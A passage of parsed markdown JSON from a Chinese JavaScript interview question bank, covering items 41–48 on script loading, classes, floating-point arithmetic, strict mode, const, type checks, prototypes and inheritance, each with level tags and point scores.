async，浏览器会立即加载并执行指定的脚本，之前加载到一半的HTML页面会停止下来，被阻塞加载。\\n","text":"没有 defer 或 async，浏览器会立即加载并执行指定的脚本，之前加载到一半的HTML页面会停止下来，被阻塞加载。","tokens":[{"type":"text","raw":"没有 defer 或 async，浏览器会立即加载并执行指定的脚本，之前加载到一半的HTML页面会停止下来，被阻塞加载。","text":"没有 defer 或 async，浏览器会立即加载并执行指定的脚本，之前加载到一半的HTML页面会停止下来，被阻塞加载。","escaped":false}]}]},{"type":"list_item","raw":"- 有 async，加载和渲染后续文档元素的过程将和 script.js 的加载与执行并行进行，将script变成异步，当scripet异步解析完成后，如果HTML页面还没有完成解析，又会继续阻塞页面的解析。\\n\\n","task":false,"loose":true,"text":"有 async，加载和渲染后续文档元素的过程将和 script.js 的加载与执行并行进行，将script变成异步，当scripet异步解析完成后，如果HTML页面还没有完成解析，又会继续阻塞页面的解析。\\n","tokens":[{"type":"text","raw":"有 async，加载和渲染后续文档元素的过程将和 script.js 的加载与执行并行进行，将script变成异步，当scripet异步解析完成后，如果HTML页面还没有完成解析，又会继续阻塞页面的解析。\\n","text":"有 async，加载和渲染后续文档元素的过程将和 script.js 的加载与执行并行进行，将script变成异步，当scripet异步解析完成后，如果HTML页面还没有完成解析，又会继续阻塞页面的解析。","tokens":[{"type":"text","raw":"有 async，加载和渲染后续文档元素的过程将和 script.js 的加载与执行并行进行，将script变成异步，当scripet异步解析完成后，如果HTML页面还没有完成解析，又会继续阻塞页面的解析。","text":"有 async，加载和渲染后续文档元素的过程将和 script.js 的加载与执行并行进行，将script变成异步，当scripet异步解析完成后，如果HTML页面还没有完成解析，又会继续阻塞页面的解析。","escaped":false}]}]},{"type":"list_item","raw":"- 有 defer，加载后续文档元素的过程将和 script.js 的加载并行进行，将script变成异步。但是 script.js 的执行要在所有元素解析完成之后，类似于将这个script放在了页面的底部。","task":false,"loose":true,"text":"有 defer，加载后续文档元素的过程将和 script.js 的加载并行进行，将script变成异步。但是 script.js 的执行要在所有元素解析完成之后，类似于将这个script放在了页面的底部。","tokens":[{"type":"text","raw":"有 defer，加载后续文档元素的过程将和 script.js 的加载并行进行，将script变成异步。但是 script.js 的执行要在所有元素解析完成之后，类似于将这个script放在了页面的底部。","text":"有 defer，加载后续文档元素的过程将和 script.js 的加载并行进行，将script变成异步。但是 script.js 的执行要在所有元素解析完成之后，类似于将这个script放在了页面的底部。","tokens":[{"type":"text","raw":"有 defer，加载后续文档元素的过程将和 script.js 的加载并行进行，将script变成异步。但是 script.js 的执行要在所有元素解析完成之后，类似于将这个script放在了页面的底部。","text":"有 defer，加载后续文档元素的过程将和 script.js 的加载并行进行，将script变成异步。但是 script.js 的执行要在所有元素解析完成之后，类似于将这个script放在了页面的底部。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 41. class和function的区别?\\n\\n","depth":2,"text":"41. class和function的区别?","tokens":[{"type":"text","raw":"41. class和function的区别?","text":"41. class和function的区别?","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 相同点：1. 函数作为构造函数\\n\\n- 不同点：\\n\\n- class构造函数必须使用new操作符。\\n\\n- class声明不可以提升。\\n\\n- class不可以用call、apply、bind改变this指向。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 相同点：1. 函数作为构造函数\\n\\n","task":false,"loose":true,"text":"相同点：1. 函数作为构造函数\\n","tokens":[{"type":"text","raw":"相同点：1. 函数作为构造函数\\n","text":"相同点：1. 函数作为构造函数","tokens":[{"type":"text","raw":"相同点：1. 函数作为构造函数","text":"相同点：1. 函数作为构造函数","escaped":false}]}]},{"type":"list_item","raw":"- 不同点：\\n\\n","task":false,"loose":true,"text":"不同点：\\n","tokens":[{"type":"text","raw":"不同点：\\n","text":"不同点：","tokens":[{"type":"text","raw":"不同点：","text":"不同点：","escaped":false}]}]},{"type":"list_item","raw":"- class构造函数必须使用new操作符。\\n\\n","task":false,"loose":true,"text":"class构造函数必须使用new操作符。\\n","tokens":[{"type":"text","raw":"class构造函数必须使用new操作符。\\n","text":"class构造函数必须使用new操作符。","tokens":[{"type":"text","raw":"class构造函数必须使用new操作符。","text":"class构造函数必须使用new操作符。","escaped":false}]}]},{"type":"list_item","raw":"- class声明不可以提升。\\n\\n","task":false,"loose":true,"text":"class声明不可以提升。\\n","tokens":[{"type":"text","raw":"class声明不可以提升。\\n","text":"class声明不可以提升。","tokens":[{"type":"text","raw":"class声明不可以提升。","text":"class声明不可以提升。","escaped":false}]}]},{"type":"list_item","raw":"- class不可以用call、apply、bind改变this指向。","task":false,"loose":true,"text":"class不可以用call、apply、bind改变this指向。","tokens":[{"type":"text","raw":"class不可以用call、apply、bind改变this指向。","text":"class不可以用call、apply、bind改变this指向。","tokens":[{"type":"text","raw":"class不可以用call、apply、bind改变this指向。","text":"class不可以用call、apply、bind改变this指向。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 42. 为什么0.1+0.2 ! == 0.3，如何让其相等 ？\\n\\n","depth":2,"text":"42. 为什么0.1+0.2 ! == 0.3，如何让其相等 ？","tokens":[{"type":"text","raw":"42. 为什么0.1+0.2 ! == 0.3，如何让其相等 ？","text":"42. 为什么0.1+0.2 ! == 0.3，如何让其相等 ？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 计算机是通过二进制的方式存储数据的，所以计算机计算0.1+0.2的时候，实际上是计算的两个数的二进制的和。0.1的二进制是0.0001100110011001100...（1100循环），0.2的二进制是：0.00110011001100...（1100循环），这两个数的二进制都是无限循环的数。那JavaScript是如何处理无限循环的二进制小数呢？\\n\\n- toFixed(num) 方法可把 Number 四舍五入为指定小数位数的数字。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 计算机是通过二进制的方式存储数据的，所以计算机计算0.1+0.2的时候，实际上是计算的两个数的二进制的和。0.1的二进制是0.0001100110011001100...（1100循环），0.2的二进制是：0.00110011001100...（1100循环），这两个数的二进制都是无限循环的数。那JavaScript是如何处理无限循环的二进制小数呢？\\n\\n","task":false,"loose":true,"text":"计算机是通过二进制的方式存储数据的，所以计算机计算0.1+0.2的时候，实际上是计算的两个数的二进制的和。0.1的二进制是0.0001100110011001100...（1100循环），0.2的二进制是：0.00110011001100...（1100循环），这两个数的二进制都是无限循环的数。那JavaScript是如何处理无限循环的二进制小数呢？\\n","tokens":[{"type":"text","raw":"计算机是通过二进制的方式存储数据的，所以计算机计算0.1+0.2的时候，实际上是计算的两个数的二进制的和。0.1的二进制是0.0001100110011001100...（1100循环），0.2的二进制是：0.00110011001100...（1100循环），这两个数的二进制都是无限循环的数。那JavaScript是如何处理无限循环的二进制小数呢？\\n","text":"计算机是通过二进制的方式存储数据的，所以计算机计算0.1+0.2的时候，实际上是计算的两个数的二进制的和。0.1的二进制是0.0001100110011001100...（1100循环），0.2的二进制是：0.00110011001100...（1100循环），这两个数的二进制都是无限循环的数。那JavaScript是如何处理无限循环的二进制小数呢？","tokens":[{"type":"text","raw":"计算机是通过二进制的方式存储数据的，所以计算机计算0.1+0.2的时候，实际上是计算的两个数的二进制的和。0.1的二进制是0.0001100110011001100...（1100循环），0.2的二进制是：0.00110011001100...（1100循环），这两个数的二进制都是无限循环的数。那JavaScript是如何处理无限循环的二进制小数呢？","text":"计算机是通过二进制的方式存储数据的，所以计算机计算0.1+0.2的时候，实际上是计算的两个数的二进制的和。0.1的二进制是0.0001100110011001100...（1100循环），0.2的二进制是：0.00110011001100...（1100循环），这两个数的二进制都是无限循环的数。那JavaScript是如何处理无限循环的二进制小数呢？","escaped":false}]}]},{"type":"list_item","raw":"- toFixed(num) 方法可把 Number 四舍五入为指定小数位数的数字。","task":false,"loose":true,"text":"toFixed(num) 方法可把 Number 四舍五入为指定小数位数的数字。","tokens":[{"type":"text","raw":"toFixed(num) 方法可把 Number 四舍五入为指定小数位数的数字。","text":"toFixed(num) 方法可把 Number 四舍五入为指定小数位数的数字。","tokens":[{"type":"text","raw":"toFixed(num) 方法可把 Number 四舍五入为指定小数位数的数字。","text":"toFixed(num) 方法可把 Number 四舍五入为指定小数位数的数字。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n(n1 + n2).toFixed(2) // 注意，toFixed为四舍五入\\n```","lang":"js","text":"(n1 + n2).toFixed(2) // 注意，toFixed为四舍五入"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 43. JS严格模式有什么特点？\\n\\n","depth":2,"text":"43. JS严格模式有什么特点？","tokens":[{"type":"text","raw":"43. JS严格模式有什么特点？","text":"43. JS严格模式有什么特点？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 全局变量必须声明\\n\\n- 禁止this指向windows\\n\\n- 函数参数名称不能重复\\n\\n- 禁止使用with语句\\n\\n- 创建eval作用域（单独作用域）","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 全局变量必须声明\\n\\n","task":false,"loose":true,"text":"全局变量必须声明\\n","tokens":[{"type":"text","raw":"全局变量必须声明\\n","text":"全局变量必须声明","tokens":[{"type":"text","raw":"全局变量必须声明","text":"全局变量必须声明","escaped":false}]}]},{"type":"list_item","raw":"- 禁止this指向windows\\n\\n","task":false,"loose":true,"text":"禁止this指向windows\\n","tokens":[{"type":"text","raw":"禁止this指向windows\\n","text":"禁止this指向windows","tokens":[{"type":"text","raw":"禁止this指向windows","text":"禁止this指向windows","escaped":false}]}]},{"type":"list_item","raw":"- 函数参数名称不能重复\\n\\n","task":false,"loose":true,"text":"函数参数名称不能重复\\n","tokens":[{"type":"text","raw":"函数参数名称不能重复\\n","text":"函数参数名称不能重复","tokens":[{"type":"text","raw":"函数参数名称不能重复","text":"函数参数名称不能重复","escaped":false}]}]},{"type":"list_item","raw":"- 禁止使用with语句\\n\\n","task":false,"loose":true,"text":"禁止使用with语句\\n","tokens":[{"type":"text","raw":"禁止使用with语句\\n","text":"禁止使用with语句","tokens":[{"type":"text","raw":"禁止使用with语句","text":"禁止使用with语句","escaped":false}]}]},{"type":"list_item","raw":"- 创建eval作用域（单独作用域）","task":false,"loose":true,"text":"创建eval作用域（单独作用域）","tokens":[{"type":"text","raw":"创建eval作用域（单独作用域）","text":"创建eval作用域（单独作用域）","tokens":[{"type":"text","raw":"创建eval作用域（单独作用域）","text":"创建eval作用域（单独作用域）","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 44. js 中const真的不能修改吗？\\n\\n","depth":2,"text":"44. js 中const真的不能修改吗？","tokens":[{"type":"text","raw":"44. js 中const真的不能修改吗？","text":"44. js 中const真的不能修改吗？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- const定义的基本类型不能改变，但是定义的引用类型中的 数组 与 对象 可以通过修改对象属性改变。 const使用建议：不要使用const定义 数组 或 对象 作为常量。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- const定义的基本类型不能改变，但是定义的引用类型中的 数组 与 对象 可以通过修改对象属性改变。 const使用建议：不要使用const定义 数组 或 对象 作为常量。","task":false,"loose":false,"text":"const定义的基本类型不能改变，但是定义的引用类型中的 数组 与 对象 可以通过修改对象属性改变。 const使用建议：不要使用const定义 数组 或 对象 作为常量。","tokens":[{"type":"text","raw":"const定义的基本类型不能改变，但是定义的引用类型中的 数组 与 对象 可以通过修改对象属性改变。 const使用建议：不要使用const定义 数组 或 对象 作为常量。","text":"const定义的基本类型不能改变，但是定义的引用类型中的 数组 与 对象 可以通过修改对象属性改变。 const使用建议：不要使用const定义 数组 或 对象 作为常量。","tokens":[{"type":"text","raw":"const定义的基本类型不能改变，但是定义的引用类型中的 数组 与 对象 可以通过修改对象属性改变。 const使用建议：不要使用const定义 数组 或 对象 作为常量。","text":"const定义的基本类型不能改变，但是定义的引用类型中的 数组 与 对象 可以通过修改对象属性改变。 const使用建议：不要使用const定义 数组 或 对象 作为常量。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 45. typeof与instanceof的区别？\\n\\n","depth":2,"text":"45. typeof与instanceof的区别？","tokens":[{"type":"text","raw":"45. typeof与instanceof的区别？","text":"45. typeof与instanceof的区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- 返回结果类型不同：typeof会返回一个变量的基本类型，instanceof返回的是一个布尔值\\n\\n- 判断范围不同：instanceof 可以准确地判断复杂引用数据类型，但是不能正确判断基础数据类型；而typeof 也存在弊端，它虽然可以判断基础数据类型（null 除外），但是引用数据类型中，除了function 类型以外，其他的也无法判断","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 返回结果类型不同：typeof会返回一个变量的基本类型，instanceof返回的是一个布尔值\\n\\n","task":false,"loose":true,"text":"返回结果类型不同：typeof会返回一个变量的基本类型，instanceof返回的是一个布尔值\\n","tokens":[{"type":"text","raw":"返回结果类型不同：typeof会返回一个变量的基本类型，instanceof返回的是一个布尔值\\n","text":"返回结果类型不同：typeof会返回一个变量的基本类型，instanceof返回的是一个布尔值","tokens":[{"type":"text","raw":"返回结果类型不同：typeof会返回一个变量的基本类型，instanceof返回的是一个布尔值","text":"返回结果类型不同：typeof会返回一个变量的基本类型，instanceof返回的是一个布尔值","escaped":false}]}]},{"type":"list_item","raw":"- 判断范围不同：instanceof 可以准确地判断复杂引用数据类型，但是不能正确判断基础数据类型；而typeof 也存在弊端，它虽然可以判断基础数据类型（null 除外），但是引用数据类型中，除了function 类型以外，其他的也无法判断","task":false,"loose":true,"text":"判断范围不同：instanceof 可以准确地判断复杂引用数据类型，但是不能正确判断基础数据类型；而typeof 也存在弊端，它虽然可以判断基础数据类型（null 除外），但是引用数据类型中，除了function 类型以外，其他的也无法判断","tokens":[{"type":"text","raw":"判断范围不同：instanceof 可以准确地判断复杂引用数据类型，但是不能正确判断基础数据类型；而typeof 也存在弊端，它虽然可以判断基础数据类型（null 除外），但是引用数据类型中，除了function 类型以外，其他的也无法判断","text":"判断范围不同：instanceof 可以准确地判断复杂引用数据类型，但是不能正确判断基础数据类型；而typeof 也存在弊端，它虽然可以判断基础数据类型（null 除外），但是引用数据类型中，除了function 类型以外，其他的也无法判断","tokens":[{"type":"text","raw":"判断范围不同：instanceof 可以准确地判断复杂引用数据类型，但是不能正确判断基础数据类型；而typeof 也存在弊端，它虽然可以判断基础数据类型（null 除外），但是引用数据类型中，除了function 类型以外，其他的也无法判断","text":"判断范围不同：instanceof 可以准确地判断复杂引用数据类型，但是不能正确判断基础数据类型；而typeof 也存在弊端，它虽然可以判断基础数据类型（null 除外），但是引用数据类型中，除了function 类型以外，其他的也无法判断","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 46. 如何判断一个变量是不是数组？\\n\\n","depth":2,"text":"46. 如何判断一个变量是不是数组？","tokens":[{"type":"text","raw":"46. 如何判断一个变量是不是数组？","text":"46. 如何判断一个变量是不是数组？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- instanceof Array\\n\\n- Array.isArray();\\n\\n- Object.prototype.toString.call();","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- instanceof Array\\n\\n","task":false,"loose":true,"text":"instanceof Array\\n","tokens":[{"type":"text","raw":"instanceof Array\\n","text":"instanceof Array","tokens":[{"type":"text","raw":"instanceof Array","text":"instanceof Array","escaped":false}]}]},{"type":"list_item","raw":"- Array.isArray();\\n\\n","task":false,"loose":true,"text":"Array.isArray();\\n","tokens":[{"type":"text","raw":"Array.isArray();\\n","text":"Array.isArray();","tokens":[{"type":"text","raw":"Array.isArray();","text":"Array.isArray();","escaped":false}]}]},{"type":"list_item","raw":"- Object.prototype.toString.call();","task":false,"loose":true,"text":"Object.prototype.toString.call();","tokens":[{"type":"text","raw":"Object.prototype.toString.call();","text":"Object.prototype.toString.call();","tokens":[{"type":"text","raw":"Object.prototype.toString.call();","text":"Object.prototype.toString.call();","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 47. class的原型本质怎么理解？\\n\\n","depth":2,"text":"47. class的原型本质怎么理解？","tokens":[{"type":"text","raw":"47. class的原型本质怎么理解？","text":"47. class的原型本质怎么理解？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 原型：所有的class都有显示原型，每个实例都有隐式原型，实例的隐式原型等于对应class的显示原型，非基本属性的class的隐式原型等于其继承的class的显示原型。\\n\\n- 原型链：每一个对象都有一个隐式原型叫__proto__，它的指向是构造函数的原型对象。当查找某个属性或方法时，先从自身上查找，没有找到会沿着__proto_找到构造函数的原型对象，仍然没有找到会继续沿着__proto__向上查找到它构造函数原型对象的原型对象，直到找到顶级对象object为null，由此形成的链条为原型链。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 原型：所有的class都有显示原型，每个实例都有隐式原型，实例的隐式原型等于对应class的显示原型，非基本属性的class的隐式原型等于其继承的class的显示原型。\\n\\n","task":false,"loose":true,"text":"原型：所有的class都有显示原型，每个实例都有隐式原型，实例的隐式原型等于对应class的显示原型，非基本属性的class的隐式原型等于其继承的class的显示原型。\\n","tokens":[{"type":"text","raw":"原型：所有的class都有显示原型，每个实例都有隐式原型，实例的隐式原型等于对应class的显示原型，非基本属性的class的隐式原型等于其继承的class的显示原型。\\n","text":"原型：所有的class都有显示原型，每个实例都有隐式原型，实例的隐式原型等于对应class的显示原型，非基本属性的class的隐式原型等于其继承的class的显示原型。","tokens":[{"type":"text","raw":"原型：所有的class都有显示原型，每个实例都有隐式原型，实例的隐式原型等于对应class的显示原型，非基本属性的class的隐式原型等于其继承的class的显示原型。","text":"原型：所有的class都有显示原型，每个实例都有隐式原型，实例的隐式原型等于对应class的显示原型，非基本属性的class的隐式原型等于其继承的class的显示原型。","escaped":false}]}]},{"type":"list_item","raw":"- 原型链：每一个对象都有一个隐式原型叫__proto__，它的指向是构造函数的原型对象。当查找某个属性或方法时，先从自身上查找，没有找到会沿着__proto_找到构造函数的原型对象，仍然没有找到会继续沿着__proto__向上查找到它构造函数原型对象的原型对象，直到找到顶级对象object为null，由此形成的链条为原型链。","task":false,"loose":true,"text":"原型链：每一个对象都有一个隐式原型叫__proto__，它的指向是构造函数的原型对象。当查找某个属性或方法时，先从自身上查找，没有找到会沿着__proto_找到构造函数的原型对象，仍然没有找到会继续沿着__proto__向上查找到它构造函数原型对象的原型对象，直到找到顶级对象object为null，由此形成的链条为原型链。","tokens":[{"type":"text","raw":"原型链：每一个对象都有一个隐式原型叫__proto__，它的指向是构造函数的原型对象。当查找某个属性或方法时，先从自身上查找，没有找到会沿着__proto_找到构造函数的原型对象，仍然没有找到会继续沿着__proto__向上查找到它构造函数原型对象的原型对象，直到找到顶级对象object为null，由此形成的链条为原型链。","text":"原型链：每一个对象都有一个隐式原型叫__proto__，它的指向是构造函数的原型对象。当查找某个属性或方法时，先从自身上查找，没有找到会沿着__proto_找到构造函数的原型对象，仍然没有找到会继续沿着__proto__向上查找到它构造函数原型对象的原型对象，直到找到顶级对象object为null，由此形成的链条为原型链。","tokens":[{"type":"text","raw":"原型链：每一个对象都有一个隐式原型叫__proto__，它的指向是构造函数的原型对象。当查找某个属性或方法时，先从自身上查找，没有找到会沿着__proto_找到构造函数的原型对象，仍然没有找到会继续沿着__proto__向上查找到它构造函数原型对象的原型对象，直到找到顶级对象object为null，由此形成的链条为原型链。","text":"原型链：每一个对象都有一个隐式原型叫__proto__，它的指向是构造函数的原型对象。当查找某个属性或方法时，先从自身上查找，没有找到会沿着__proto_找到构造函数的原型对象，仍然没有找到会继续沿着__proto__向上查找到它构造函数原型对象的原型对象，直到找到顶级对象object为null，由此形成的链条为原型链。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 48. ES5、ES6 如何实现继承?\\n\\n","depth":2,"text":"48. ES5、ES6 如何实现继承?","tokens":[{"type":"text","raw":"48. ES5、ES6 如何实现继承?","text":"48. ES5、ES6 如何实现继承?","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- ES5：①原型链继承 ②构造函数继承 ③组合继承 ④寄生组合继承\\n\\n- ES6：ES6 中引入了 class 关键字， class 可以通过 extends 关键字实现继承。ES6的继承中super是用来①调用父类函数 ②指向父类的原型","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- ES5：①原型链继承 ②构造函数继承 ③组合继承 ④寄生组合继承\\n\\n","task":false,"loose":true,"text":"ES5：①原型链继承 